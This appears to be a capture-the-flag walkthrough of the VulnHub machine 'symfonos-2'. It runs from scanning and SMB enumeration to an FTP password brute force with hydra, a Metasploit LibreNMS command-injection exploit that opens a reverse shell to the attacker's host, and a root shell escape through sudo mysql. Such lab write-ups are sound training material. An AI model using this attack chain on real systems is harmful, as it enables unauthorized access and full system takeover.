# symfonos-2
![](https://i.imgur.com/KQ35xj7.png)


![](https://i.imgur.com/xFuN05J.png)


## Scanning
### nmap
```
$ nmap -p- -A -T5 192.168.109.132
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-03 22:35 EDT
Nmap scan report for 192.168.109.132
Host is up (0.0015s latency).
Not shown: 65530 closed ports
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         ProFTPD 1.3.5
22/tcp  open  ssh         OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 9d:f8:5f:87:20:e5:8c:fa:68:47:7d:71:62:08:ad:b9 (RSA)
|   256 04:2a:bb:06:56:ea:d1:93:1c:d2:78:0a:00:46:9d:85 (ECDSA)
|_  256 28:ad:ac:dc:7e:2a:1c:f6:4c:6b:47:f2:d6:22:5b:52 (ED25519)
80/tcp  open  http        WebFS httpd 1.21
|_http-server-header: webfs/1.21
|_http-title: Site doesn't have a title (text/html).
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.5.16-Debian (workgroup: WORKGROUP)
Service Info: Host: SYMFONOS2; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h40m00s, deviation: 2h53m13s, median: 0s
|_nbstat: NetBIOS name: SYMFONOS2, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.5.16-Debian)
|   Computer name: symfonos2
|   NetBIOS computer name: SYMFONOS2\x00
|   Domain name: \x00
|   FQDN: symfonos2
|_  System time: 2021-08-03T21:36:15-05:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-08-04T02:36:14
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 70.27 seconds
                               
```
### enum4linux
```
$ enum4linux -U -S -o 192.168.109.132          
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Tue Aug  3 22:42:34 2021

...

 ============================================ 
|    Share Enumeration on 192.168.109.132    |
 ============================================ 

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        anonymous       Disk      
        IPC$            IPC       IPC Service (Samba 4.5.16-Debian)
SMB1 disabled -- no workgroup available

[+] Attempting to map shares on 192.168.109.132
//192.168.109.132/print$        Mapping: DENIED, Listing: N/A
//192.168.109.132/anonymous     Mapping: OK, Listing: OK
//192.168.109.132/IPC$  [E] Can't understand response:
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*
enum4linux complete on Tue Aug  3 22:42:34 2021
```
### smbclient
```
$ smbclient //192.168.109.132/anonymous -U % -N
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Jul 18 10:30:09 2019
  ..                                  D        0  Thu Jul 18 10:29:08 2019
  backups                             D        0  Thu Jul 18 10:25:17 2019

                19728000 blocks of size 1024. 16313212 blocks available
smb: \> cd backups\
smb: \backups\> ls
  .                                   D        0  Thu Jul 18 10:25:17 2019
  ..                                  D        0  Thu Jul 18 10:30:09 2019
  log.txt                             N    11394  Thu Jul 18 10:25:16 2019

                19728000 blocks of size 1024. 16313212 blocks available
smb: \backups\> get log.txt 
getting file \backups\log.txt of size 11394 as log.txt (5563.2 KiloBytes/sec) (average 5563.5 KiloBytes/sec)
smb: \backups\> 

```
```
$ cat log.txt
root@symfonos2:~# cat /etc/shadow > /var/backups/shadow.bak
root@symfonos2:~# cat /etc/samba/smb.conf

...

root@symfonos2:~# cat /usr/local/etc/proftpd.conf
# This is a basic ProFTPD configuration file (rename it to 
# 'proftpd.conf' for actual use.  It establishes a single server
# and a single anonymous login.  It assumes that you have a user/group
# "nobody" and "ftp" for normal operation and anon.

ServerName                      "ProFTPD Default Installation"
ServerType                      standalone
DefaultServer                   on

# Port 21 is the standard FTP port.
Port                            21

# Don't use IPv6 support by default.
UseIPv6                         off

# Umask 022 is a good standard umask to prevent new dirs and files
# from being group and world writable.
Umask                           022

# To prevent DoS attacks, set the maximum number of child processes
# to 30.  If you need to allow more than 30 concurrent connections
# at once, simply increase this value.  Note that this ONLY works
# in standalone mode, in inetd mode you should use an inetd server
# that allows you to limit maximum number of processes per service
# (such as xinetd).
MaxInstances                    30

# Set the user and group under which the server will run.
User                            aeolus
Group                           aeolus

...

```
## Gain Access
### hydra
```
$ hydra -l aeolus -P /usr/share/wordlists/rockyou.txt ftp://192.168.109.132 -t 64
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-08-03 23:05:40
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
[DATA] attacking ftp://192.168.109.132:21/
[STATUS] 6168.00 tries/min, 6168 tries in 00:01h, 14338360 to do in 38:45h, 64 active
[STATUS] 6246.00 tries/min, 18738 tries in 00:03h, 14325790 to do in 38:14h, 64 active
[21][ftp] host: 192.168.109.132   login: aeolus   password: sergioteamo
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 36 final worker threads did not complete until end.
[ERROR] 36 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-08-03 23:09:53
```
### ssh
```
$ ssh aeolus@192.168.109.132
```
## Privilege Escalation
### /etc/apache2/ports.conf 
```
$ cat /etc/apache2/ports.conf 
# If you just change the port or add more ports here, you will likely also
# have to change the VirtualHost statement in
# /etc/apache2/sites-enabled/000-default.conf

Listen 127.0.0.1:8080

<IfModule ssl_module>
        Listen 443
</IfModule>

<IfModule mod_gnutls.c>
        Listen 443
</IfModule>

# vim: syntax=apache ts=4 sw=4 sts=4 sr noet
```
### socat
```
socat TCP-LISTEN:5000,fork,reuseaddr tcp:127.0.0.1:8080
```
![](https://i.imgur.com/ApFhA7P.png)
### librenms_addhost_cmd_inject
```
msf6 > use exploit/linux/http/librenms_addhost_cmd_inject 
[*] Using configured payload cmd/unix/reverse
msf6 exploit(linux/http/librenms_addhost_cmd_inject) > set RHOSTS symfonos.local
RHOSTS => symfonos.local
msf6 exploit(linux/http/librenms_addhost_cmd_inject) > set RPORT 5000
RPORT => 5000
msf6 exploit(linux/http/librenms_addhost_cmd_inject) > set LHOST 192.168.109.128
LHOST => 192.168.109.128
msf6 exploit(linux/http/librenms_addhost_cmd_inject) > set USERNAME aeolus
USERNAME => aeolus
msf6 exploit(linux/http/librenms_addhost_cmd_inject) > set PASSWORD sergioteamo
PASSWORD => sergioteamo
msf6 exploit(linux/http/librenms_addhost_cmd_inject) > run

[*] Started reverse TCP double handler on 192.168.109.128:4444 
[*] Successfully logged into LibreNMS. Storing credentials...
[+] Successfully added device with hostname xynmpMOCTE
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[+] Successfully deleted device with hostname xynmpMOCTE and id #5
[*] Command: echo dl02nQ8wwrhHQFph;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket A
[*] A: "dl02nQ8wwrhHQFph\r\n"
[*] Matching...
[*] B is input...
[*] Command shell session 1 opened (192.168.109.128:4444 -> 192.168.109.132:45296) at 2021-08-04 00:28:58 -0400

/bin/sh -i
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=1001(cronus) gid=1001(cronus) groups=1001(cronus),999(librenms)

```
### sudo -l
```
$ sudo -l
Matching Defaults entries for cronus on symfonos2:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User cronus may run the following commands on symfonos2:
    (root) NOPASSWD: /usr/bin/mysql
```
### mysql
```
$ sudo -u root mysql -e '\! /bin/sh'
id
uid=0(root) gid=0(root) groups=0(root)
```

## Reference
* [vulnhub - ](https://www.vulnhub.com/)
* [Hacking Articles - ](https://www.hackingarticles.in)
* [blog.mzfr.me - ](https://blog.mzfr.me/vulnhub-writeups)